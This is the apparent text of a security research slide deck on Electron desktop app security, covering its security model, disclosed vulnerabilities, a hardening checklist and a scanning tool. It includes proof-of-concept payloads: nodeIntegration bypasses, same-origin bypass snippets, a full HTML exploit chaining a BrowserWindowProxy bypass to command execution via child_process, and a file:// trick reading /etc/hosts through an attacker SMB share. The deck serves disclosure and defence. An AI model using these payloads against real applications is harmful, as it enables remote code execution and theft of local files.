Electronegativity 
A Study of Electron Security
Luca Carettoni - luca@doyensec.com

About me
· AppSec since 2004 · Doyensec Co-founder · Former Lead of
AppSec (LinkedIn), Director of Security (Addepar), Senior Security Researcher (Matasano), ....

Agenda
1. Electron Overview 2. Ecosystem 3. Security Model 4. Attack Surface 5. Apps Security Checklist
· Electronegativity 6. Conclusion

Thanks to:
· Electron Core and Github Security Teams · For the best disclosure experience in 15 years of vulnerability research
· Claudio Merloni · For the help on Electronegativity code

1. Electron Overview

https://electron.atom.io/

· OpenSource framework to build desktop apps using HTML, CSS and JavaScript 
· Maintained by 

"If you can build a website, you can build a desktop app"

Principles
· Cross-platform. runtime with self-contained dependencies
· Modular. To facilitate re-use and keep Electron small and simple
· Easy to use. You shouldn't worry about installers, profiling, debugging, notifications, updates, ...

Back and forth
· Web Development is fun, but... · Conditional rules for all different browsers and versions · Limited I/O with the OS · Performance and network latency

Ingredients

Lifecycle

app.asar

package.json

main process main.js

render process
render process
render process render.js
...

HTML CSS
JS

Processes

Main
ipcMain Node.js API Menu, Tray, ... BrowserWindow

Renderer

communicates creates

Node.js API ipcRenderer <webview>
DOM webFrame

IpcMain and ipcRenderer 1/2
· Synchronous and Asynchronous messages from the renderer (web page) to the main process
// Main const {ipcMain} = require('electron') ipcMain.on('synchronous-message', (event, arg) => {
console.log(arg) event.returnValue = 'pong' })
// Renderer const {ipcRenderer} = require('electron') console.log(ipcRenderer.sendSync('synchronous-message', 'ping'))

IpcMain and ipcRenderer 2/2
· Interestingly, this is also used for implementing native Electron APIs
· /lib/browser/rpc-server.js

2. Ecosystem

Many Electron-based Apps
...and 350* more
* Registered on https://electron.atom.io/apps/

Electron -- NPM
· So, you can import custom NPM modules
· ~Half a million packages of vulnerable reusable code · "How I obtained publish access to 13% of npm packages (including popular ones)" · "LeftPad broke the Internet"
· There are also Electron-specific modules: · Tools · Boilerplates · Components

3. Security Model

Browser Security Model
"Several experts have told me in all seriousness that browser security models are now so complex that I should not even write a section about this"
Threat Modeling - Adam Shostack

Browser Threat Model

Browser Threat Model

From Browser to Electron - Malicious Content
· Untrusted content from the web
· Limited interaction, compared to a browser · E.g. opening a <webview> with a remote origin
· Untrusted local resources
· Extended attack surface · E.g. loading subtitle files

From Browser to Electron - Isolation
· Potential access to Node.js primitives · Limited Chrome-like sandbox
· From XSS to RCE · Exploits are reliable

Electron is NOT a browser
· While it is based on Chromium's Content module, certain principles and security mechanisms implemented by modern browsers are not enforced in today's Electron · Things will change in Electron v2.x

nodeIntegration / nodeIntegrationInWorker
· Control whether access to Node.js primitives is allowed from JavaScript · Part of webPreferences · In recent versions, Chrome's Isolated Worlds is used · New v8 context with proxies to the window and document object (ro)

nodeIntegration

TRUE

FALSE

Renderer Isolation
1. BrowserWindow (nodeIntegration enabled by default)

mainWindow = new BrowserWindow({ "webPreferences": { "nodeIntegration" : false, "nodeIntegrationInWorker" : false }});
2. <webview> tag (nodeIntegration disabled by default)
<webview id="foo" src="https://www.doyensec.com/"></webview>

Sandboxing 1/2
· sandbox - Experimental feature · Currently supports BrowserWindow only · This will allow renderer to run inside a native
Chromium OS sandbox · All communication via IPC to the main process · When sanbox is enabled, nodeintegration is
disabled

Sandboxing 2/2
· Sandboxing needs to be explicitly enabled: 
mainWindow = new BrowserWindow({ "webPreferences": { "sandbox" : true}});
· To enable it for all BrowserWindow instances, a command line argument is necessary: 
$ electron --enable-sandbox app.js

Resistance is futile
· Preload scripts still have access to few modules
· child_process, crashReporter, remote, ipcRenderer, fs, os, times, url
1. Sandbox bypass in preload scripts using remote   app = require('electron').remote.app
2. Sandbox bypass in preload scripts using internal Electron IPC messages  
{ipcRenderer} = require('electron') app = ipcRenderer.sendSync('ELECTRON_BROWSER_GET_BUILTIN', 'app')

ContextIsolation
· This flag introduces JavaScript context isolation for preload scripts, as implemented in Chrome Content Scripts
· Preload scripts still have access to global variables (ro)
 
win = new BrowserWindow({ webPreferences: { contextIsolation: true, preload: 'preload.js'
}})

Electron vs Muon

Muon

·

Brave's fork of Electron

· Direct use of Chromium source code · Support for Chrome extensions · Node.js removed from the renderer · IPC still supported in the renderer
process through custom chrome.* APIs · Chromium OS sandbox

Research idea
· https://github.com/brave/muon/issues/165

4. Attack Surface

Electron App Attack Surface

Custom Code
· Insecure use of APIs · Untrusted resources · Custom protocol handlers · Preload scripts · TLS validation disabled ·...

Your App

Dependencies
· Vulnerable or unmaintained NPM

npm npm npm npm npm npm npm

Framework
· Outdated vulnerable versions · Glorified APIs · Custom Flags

Electron

Foundation
· Outdated vulnerable versions · Runtime Flags

Libchromiumcontent

Node.js

Focus of my research

Custom Code
· Insecure use of APIs · Untrusted resources · Custom protocol handlers · Preload scripts · TLS validation disabled ·...

Your App

Dependencies
· Vulnerable or unmaintained NPM

npm npm npm npm npm npm npm

Framework
· Outdated vulnerable versions · Glorified APIs · Custom Flags

Electron

Foundation
· Outdated vulnerable versions · Runtime Flags

Libchromiumcontent

Node.js

Foundation - Outdated Chromium and Node.js
· Electron-dev community is well aware · They've established an upgrade policy*:
· ~2 weeks after new stable Chrome · ~4 weeks after new Node.js
· V8 upgrades already there
* see https://electron.atom.io/docs/faq/#when-will-electron-upgrade-tolatest-chrome "This estimate is not guaranteed and depends on the amount of work involved with upgrading"

Foundation - Outdated Chromium and Node.js
· Keeping track of all changes is hard
· Making sure that all security changes have been back-ported is even harder

I -- ChangeLogs
· On 2017-02-21, Node 7.6.0 release included the following pull request:

· Until May, Electron was still on Node 7.4.0 · Notified the team on May 12, 2017 · Fixed in v1.6.11 on May 25, 2017

Framework - Weaknesses and bugs
· Framework level bugs are particularly interesting: 1. Deviations from browser principles and security mechanisms 2. Implementation bugs
· Mostly discovered reading source code and documentation

Framework - Outdated vulnerable versions
· Apps are shipped with a build of Electron · nodeIntegration bypasses are golden tickets:
1. Find XSS 2. Exploit the nodeIntegration bypass 3. Use Node.js APIs to obtain reliable RCE

History of nodeIntegration bypasses
· Limited disclosure of this type of vulnerabilities · "As it stands Electron Security" by Dean Kerr - 9 March 2016
· Window.Open - Fixed in v0.37.4 (Issue 4026) · Credit: Jeffrey Wear
<script> window.open("http://x.x.x.x/index.html", "","nodeIntegration=1");
</script>
· WebView Attribute - Fixed in v0.37.8 (Issue 3943) · Credit: Cheng Zhao
<webview nodeintegration src="http://x.x.xx/index.html"></webview>

Have I told you that I -- ChangeLogs?
· Goal: study all past vulnerabilities
· Starting from Electron v1.3.2, each release includes changelog entries
· Reverse psychology before reverse engineering
Never  Look  Here

Spot the security fix 1/2

Spot the security fix 2/2

Results:
· v1.4.15: The webview element now emits the context-menu event from the underlying webContents object
· v1.4.11: Fixed an issue where window.alert, window.close, and window.confirm did not behave as expected
· v1.3.13: Fixed an issue where window.alert, window.close, and window.confirm did not behave as expected
· v1.4.10: Fixed an issue where the window.opener API did not behave as expected
· v1.3.12: Fixed an issue where the window.opener API did not behave as expected
· v1.4.7: Fixed an issue where the window.opener API did not behave as expected · v1.3.9: Fixed an issue where the window.opener API did not behave as expected · v0.37.8: Disable node integration in webview when it is disabled in host page · v0.37.4: Disable node integration in child windows opened with window.open
when node integration is disabled in parent window

Electron core team is awesome!

Case Study: v1.3.9 Changes
· Protip: reversing a back-port is easier, smaller diff
· Included code changes to check whether the sender is parent of target, nodeIntegration is enabled and same origin
· So it had something to do with window.open without Node, but enabled in the parent 
· Proof-of-Concept:
<script> window.opener.eval(`window.open("http://x.x.x.x/foo.html","","nodeIntegration=yes")'); </script>

We're on 1.6.x
· Apparently, no bypasses fixed in recent versions
· Started reading the documentation and realized that I could bypass SOP using one of the following:
<script> const win1 = window.open("https://www.google.com"); win1.eval("alert(document.domain)"); </script>  <script> const win2 = window.open("https://www.google.com"); win2.location = "javascript:alert(document.domain)"; </script>

SOP-Bypass As a Feature
· The current implementation does not strictly enforce the Same-Origin Policy · Still work in progress
· https://github.com/electron/electron/pull/8963
· --disablewebsecurity exists, but it's kind of irrelevant

BrowserWindowProxy and Eval
· A good example of Electron's "Glorified" APIs · When you open a new window with open(), Electron
returns a BrowserWindowProxy object

Parent

1 - windows.open() 2 - BrowserWindowProxy obj 3 - windows.eval(js_code)

Child 4 - js_code

SOP2RCE
· How can we leverage the SOP-bypass to obtain code execution?
· lib/renderer/init.js

PoC - Reported on May 10 Fixed in v1.6.8
<!DOCTYPE html> <html>
<head> <title>Electron 1.6.7 BrowserWindowProxy SOP -> RCE</title>
</head> <body> <script>
document.write("Current location:" + window.location.href + "<br>");
const win = window.open("chrome-devtools://devtools/bundled/inspector.html"); win.eval("const execFile = require('child_process').execFile; const child = execFile('touch', ['/tmp/electronegativity'], (error, stdout, stderr) => {});"); </script> </body> </html>

Demo - Attacking Full Chain

Framework - "Glorified" APIs
· Electron extends the default JavaScript APIs · nodeIntegration doesn't affect this behavior · However, sandboxed renderers are supposed
to have native Chromium-like APIs · Current implementation does not revert the
behavior of ALL "glorified" APIs

Example: HTML5 File path attribute
· HTML5 File API capabilities was extended in Electron with the path attribute
· Path exposes the file's real path on the fs
· For reference, modern browsers do limit path exposure during files upload
· E.g. IE8 replaces the filename property with a bogus value c:\fakepath\file.txt

Framework - "Glorified" APIs bug
· The extended behavior is still exposed even when sandbox:true
· A remote origin could leverage this bug to leak the full path and username
· Reported on May 10th, still open

Framework - Deviations from browser standards
· We have already discussed SOP enforcement · file:// handler can be abused to read arbitrary files
· Untrusted page can read local resources without user interaction · Open issue https://github.com/electron/electron/issues/5151
window.open("smb://guest:guest@attackersite/public/"); setTimeout(function(){ window.open("file:///Volumes/public/test.html"); }, 10000);
<!-- test.html --> <iframe src="file:///etc/hosts" onload="alert(this.contentDocument.body.innerHTML)"></ iframe>
· Fewer restrictions around privacy and secure UX

Example: HTML5 Media Capture API
· HTML5 allows access to local media devices, thus making possible to record video and audio
· Browsers have implemented notification to inform the user that a remote site is capturing the webcam stream

HTML5 Media Capture API in Electron
· Electron does not display any notification · XSS on Electron apps can be leveraged to
silently capture screenshots, video and audio recording

5. Electron-based Apps 
Security Checklist 


Custom Code - Vulnerabilities in your app
· On top of what we discussed so far, there are also application vulnerabilities · Traditional web vulnerabilities · Insecure use of Electron's APIs · Wrong assumptions (Browser vs Electron)

Our practical checklist
1. Disable nodeIntegration for untrusted origins 2. Use sandbox for untrusted origins 3. Review the use of command line arguments 4. Review the use of preload scripts 5. Do not use disablewebsecurity 6. Do not allow insecure HTTP connections 7. Do not use Chromium's experimental features 8. Limit navigation flows to untrusted origins 9. Use setPermissionRequestHandler for
untrusted origins 10. Do not use insertCSS, executeJavaScript or
eval with user-supplied content 11. Do not allow popups in webview 12. Review the use of custom protocol handlers 13. Review the use of openExternal

Electronegativity
· To facilitate secure development and security testing, we are also releasing a tool
· Leverages AST parsing to look for all issues discussed in the checklist 
· Our checklist white paper and Electronegativity code will be available at:  https://www.doyensec.com/research.html

Demo - Electronegativity

6. Conclusions

Conclusions
· We have examined and exposed Electron's design and implementation flaws
· We have derived a comprehensive checklist for developers and auditors
· Hopefully, our study will lead to more secure Electron apps
· Today's Electron is not secure (by default) to render untrusted content: · Having a good understanding of Electron's internals, secure apps can be built · v2.x is expected to be the security game-changer

Future Work
· Electron vs Muon · Leverage Electronegativity to understand
the state of Electron Apps security · More vulnerability research on Electron

Thanks!
· Feel free to reach out · @lucacarettoni · luca@doyensec.com

